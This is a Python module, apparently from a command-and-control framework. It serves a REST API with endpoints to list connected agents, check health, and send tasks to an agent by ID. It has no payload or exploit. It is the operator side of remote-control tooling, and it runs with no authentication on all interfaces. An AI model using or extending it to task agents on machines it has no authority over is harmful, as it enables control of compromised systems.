"""REST API for C2 management"""
import json
from http.server import HTTPServer, BaseHTTPRequestHandler

class C2APIHandler(BaseHTTPRequestHandler):
    server_ref = None
    
    def do_GET(self):
        if self.path == "/agents":
            self._respond(200, self.server_ref.list_agents())
        elif self.path == "/health":
            self._respond(200, {"status": "ok", "agents": len(self.server_ref.agents)})
        else:
            self._respond(404, {"error": "not found"})
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}
        if self.path == "/task":
            tid = self.server_ref.task_agent(body["agent_id"], body["type"], body.get("params"))
            self._respond(200, {"task_id": tid})
        else:
            self._respond(404, {"error": "not found"})
    
    def _respond(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def log_message(self, *args): pass

def start_api(c2_server, port=8443):
    C2APIHandler.server_ref = c2_server
    httpd = HTTPServer(("0.0.0.0", port), C2APIHandler)
    print(f"[*] C2 API on http://0.0.0.0:{port}")
    httpd.serve_forever()
